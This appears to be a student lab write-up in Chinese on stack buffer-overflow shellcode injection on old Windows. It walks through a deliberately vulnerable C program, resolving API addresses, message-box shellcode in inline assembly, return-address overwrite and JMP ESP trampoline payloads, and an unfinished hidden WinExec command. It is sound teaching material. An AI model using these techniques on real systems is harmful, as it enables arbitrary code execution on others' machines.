---
title: Shellcode利用 date: 2019-11-13 11:33:59 tags:

- "网络空间安全"
- "软件安全"
  categories:
- ["实验","软件安全"]
- ["漏洞","shellcode注入"]
  comments: true

---

## 目标

理解shellcode注入原理，通过淹没静态地址和跳板两种方法实现shellcode代码植入，尝试修改汇编语句的shellcode实现修改标题等简单操作。
<!-- more -->

## 测试步骤与结果

源码如下 {% codeblock lang:c %}

# include <stdio.h>

# include <windows.h>

# include <string>

# define PASSWORD "1234567"

int verify_password (char *password)
{ int authenticated; char buffer[44]; authenticated=strcmp(password,PASSWORD); strcpy(buffer,password); //overflowed
here!
return authenticated; } main()
{ int valid_flag=0; char password[1024]; FILE * fp; LoadLibrary("user32.dll"); //prepare for messagebox if(!(fp=fopen("
password.txt","rw+")))
{ exit(0); } fscanf(fp,"%s",password); valid_flag = verify_password(password); if(valid_flag)
{ printf("incorrect password!\n"); } else { printf("Congratulation! You have passed the verification!\n"); } fclose(fp);
} {% endcodeblock %} 整体来说，是从`password.txt`文件中读取内容，并进行验证。 {% grouppicture 2-2 %} {% asset_img 0-1.png "密码正确" %} {%
asset_img 0-2.png "密码错误" %} {% endgrouppicture %}

在`strcpy`处依然存在溢出漏洞。不过`buffer`的长度更长了，可以承载一些shellcode。`User32.dll`的载入可以让我们在注入shellcode时调用`MessageBox`函数。

### shellcode代码理解

1. 由于涉及到了`dll`库的加载，我们打开源程序，用dependency walker分析dll依赖。 {% grouppicture 2-2 %} {% asset_img 1.png %} {% asset_img 2.png %}
   {% endgrouppicture %}
2. 查出`kernel32.dll`的实际基址地址为`0x77e60000`，`ExitProcess`的地址的入口点为`0x01b0bb`，加起来就是`ExitProcess`的实际地址`0x77e7b0bb`
   。这是shellcode代码中`exitprocess`地址的来源。
3. 同样方法找出`user32.dll`的基址为`0x77df0000`，`MessageBoxA`的入口点为`0x033d68`，相加得到`MessageBoxA`的实际地址为`0x77e23d68`
   。这是shellcode代码中`messageBoxA`的地址来源。 {% grouppicture 2-2 %} {% asset_img 3.png %} {% asset_img 4.png %} {%
   endgrouppicture %} {% grouppicture 2-2 %} {% asset_img 5.png %} {% asset_img 6.png %} {% endgrouppicture %} {%
   grouppicture 2-2 %} {% asset_img 7.png %} {% asset_img 8.png %} {% endgrouppicture %}
4. 接下来调试shellcode代码。shellcode源码如下

```c shellcode.c
#include<windows.h>
int main()
{
	HINSTANCE LibHandle;
	char dllbuf[11] = "user32.dll";
	LibHandle = LoadLibrary(dllbuf);
	_asm{
		sub sp,0x440
		xor ebx,ebx
		push ebx
		push 0x74707562		//bupt
		push 0x74707562		//bupt

		mov eax,esp
		push ebx
		push eax
		push eax
		push ebx

		mov eax,0x77E23D68	//messageboxA  入口地址
		call eax
		push ebx
		mov eax,0x77E7B0BB	//exitprocess  入口地址
		call eax
	}
	return 0;
}
```

5. 运行该代码，发现程序弹出了一个含有`"buptbupt"`标题的对话框 {% asset_img 9.png %} {% asset_img 10.png %}
6. 用ollydbg打开shellcode程序，把我们写的汇编代码复制出来

### 淹没静态地址的shellcode注入

1. 用ollydbg打开`overflow_exe.exe`程序，在`strcpy`处下一个断点。 {% asset_img 11.png %}
2. `strcpy`将拷贝字符串到`0x12faf0`地址处，这也是我们将要放shellcode的地址。 {% asset_img 12.png %}
3. 下面构造payload，我们构造的形式类似于Shellcode + `0x90`若干 +
   shellcode在缓冲区的起始地址，要注意逆序书写。Shellcode的返回地址应当在buff的容量+authenticated变量空间+ebp之后，也就是第53~56字节处。综上，我们构造payload如下 {%
   asset_img 13.png %}
4. 再运行程序，发现`0x12faf0`开始的空间已经覆盖为了我们所需要的样子。 {% asset_img 14.png %}
5. 返回到shellcode地址后，其中所写的内容都作为代码执行了。 {% asset_img 15.png %}
6. 当然也可以弹出对话框了，脱离ollydbg环境也可以成功。 {% asset_img 16.png %} {% asset_img 17.png %}

### 利用跳板的shellcode注入

1. 仍在`strcpy`函数上设置断点，运行至其附近。
2. 右键选择overflow return address → ASCII overflow returns → search JMP/CALL ESP
3. 根据提示查看日志，发现有很多可以利用的地方。选择一条在`user32.txt`中的地址，`0x77e2e32a`。这个是`jmp esp`的地址。 {% asset_img 18.png %} {% asset_img 19.png
   %}
4. 这次的payload形式为52字节填充物 + 4字节`JMP ESP`地址（逆序） + shellcode (可选 + 若干`0x90`)。 {% note info %}
   下图payload也可以成功弹框出来。但是程序没退出，后来发现shellcode中忘记调用<code>ExitProcess</code>函数，补上就更加完美了 {% asset_img 20.png %} {% asset_img
   21.png %} {% endnote %}

### 修改汇编语句，改变弹窗标题

通过阅读汇编代码得知，这个`"buptbupt"`字符串实际上来自两个push操作，每次是4个字母。那么改变push的参数，我们也应该能对标题框的显示进行改变。

{% note warning %} 如果尝试输出中文，需要注意一个汉字由两个字节表示，push输出时应该全部（字内和字间）逆序书写 {% endnote %}

## 测试结论

{% grouppicture 2-2 %} {% asset_img IMG20191109132950.jpg "淹没静态地址的shellcode注入示意" %} {% asset_img IMG20191109134305.jpg "
利用跳板的shellcode注入示意" %} {% endgrouppicture %}

## 思考题

{% note warning %} 本段文字并未完全完成实验，这里只是列出了部分思路。 {% endnote %} 程序源代码如下

```c stackOverrun.c
/*
  StackOverrun.c
  This program shows an example of how a stack-based
  buffer overrun can be used to execute arbitrary code.  Its
  objective is to find an input string that executes the function bar().
*/
#include <stdio.h>
#include <windows.h>
#include <string.h>

void foo(const char* input)
{
    char buf[10];

    LoadLibrary("user32.dll");//prepare for messagebox

    //What? No extra arguments supplied to printf?
    //It's a cheap trick to view the stack 8-)
    //We'll see this trick again when we look at format strings.
    printf("My stack looks like:\n%p\n%p\n%p\n%p\n%p\n% p\n%p\n%p\n%p\n%p\n\n");

    //Pass the user input straight to secure code public enemy #1.
    strcpy(buf, input);
    printf("%s\n", buf);

    printf("Now the stack looks like:\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n%p\n\n");
}

void bar(void)
{
    printf("Augh! I've been hacked!\n");
}

int main(int argc, char* argv[])
{
    //Blatant cheating to make life easier on myself
    printf("Address of foo = %p\n", foo);
    printf("Address of bar = %p\n", bar);

    foo(argv[1]);
    return 0;
}
```

这次的程序比上次多了`LoadLibrary`调用和`Windows.h`头文件，但大体逻辑没有变化。目标是通过dir命令将C盘根目录结构保存在`shellcode.txt`中。

1. shellcode需要利用系统调用`CreateProcessA`或`WinExec`，这里选择`WinExec("cmd.exe /c dir C:\\ > shellcode.txt", SW_HIDE)`。
    * 其中`SW_HIDE=0`意味着隐藏窗口，更具隐蔽性

2. 首先找到`WinExec`的地址，还是打开dependency walker查看。 {% asset_img 思考题-1.png %}
    * 通过计算可得`WinExec`的地址为`kernel32.dll`的基址加上`WinExec`的入口点地址，为`0x77e78601`。
    * 用同样的方法计算出`ExitProcess`的地址为`0x77e7b0bb`。

3. 通过试运行程序得知，我们的命令行输入被存储在了`0x12ff68`开头的位置上。`bar`的地址为`0x401070`，`jmp esp`后将从`0x12ff78`开始执行我们的shellcode。 {% grouppicture
   2-2 %} {% asset_img 思考题-2.png %} {% asset_img 思考题-3.png %} {% endgrouppicture %}

4. 扫描到了很多`jmp esp`的地址，本次选择`0x77e2e32a`中`user32.text`的地址作为跳板 {% asset_img 思考题-4.png %}

5. 首先，完成前半部分的填充和`bar`函数调用。 {% grouppicture 2-2 %} {% asset_img 思考题-6.png %} {% asset_img 思考题-7.png %} {% endgrouppicture
   %}

6. 把我们的所有操作写成一个c文件，编译，把生成的exe拿到ollydbg运行一遍，拿到我们的shellcode。这是需要的操作部分：

```c
const char command[40] = "cmd.exe /c dir C:\\>shellcode.txt";
WinExec(command, SW_HIDE);
ExitProcess(0);
```

{% note warning %} 表面上看非常不错，但这样的字符串是在rdata段里的，复制出来的操作码取的就是内存中的相对值，所以只能靠push推入。 {% asset_img 思考题-8.png %} 把`command`
数组写成一个一个字符分开的模式，末尾的`\x00`要手动加上。目前的问题停留在了栈上字符串的构造上。 {% endnote %}
